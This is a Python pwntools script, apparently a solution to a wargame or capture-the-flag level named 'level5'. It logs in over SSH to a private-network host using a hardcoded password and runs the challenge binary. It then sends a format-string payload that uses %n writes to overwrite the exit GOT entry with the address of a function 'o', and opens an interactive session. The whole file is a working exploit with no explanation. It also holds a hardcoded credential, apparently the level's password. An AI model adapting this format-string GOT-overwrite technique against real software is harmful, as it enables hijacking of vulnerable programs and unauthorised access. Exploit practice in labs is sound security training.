from pwn import *

def calculate_padding(bytes_written, desired_byte) :
    desired_byte += 0x100
    bytes_written %= 0x100
    padding = (desired_byte - bytes_written) % 0x100
    if (padding < 10) :
        padding += 0x100
    return padding

s = ssh(host='192.168.1.45', port=4242, user="level5", password="0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a")
p = s.process("/home/user/level5/./level5")

# exit .got.plt 0x8049838
# <o> 0x080484a4


first_second_bytes_addresses = b"\x38\x98\x04\x08\x11\x11\x11\x11\x39\x98\x04\x08\x22\x22\x22\x22"
third_fourth_bytes_addresses = b"\x3a\x98\x04\x08\x33\x33\x33\x33\x3b\x98\x04\x08"

jumpers = b"%016u%016u"
payload = first_second_bytes_addresses + third_fourth_bytes_addresses + jumpers
bytes_written = 0x3C

first_byte_padding = calculate_padding(bytes_written, 0xa4)
payload += b"%0" + (str(first_byte_padding)).encode() + b"u%n"
bytes_written += first_byte_padding

second_byte_padding = calculate_padding(bytes_written, 0x84)
payload += b"%0" + (str(second_byte_padding)).encode() + b"u%n"
bytes_written += second_byte_padding

third_byte_padding = calculate_padding(bytes_written, 0x04)
payload += b"%0" + (str(third_byte_padding)).encode() + b"u%n"
bytes_written += third_byte_padding

fourth_byte_padding = calculate_padding(bytes_written, 0x08)
payload += b"%0" + (str(fourth_byte_padding)).encode() + b"u%n"
bytes_written += fourth_byte_padding

p.sendline(payload)
p.interactive()

#file = open("payload", "wb")
#file.write(payload)
#file.close()
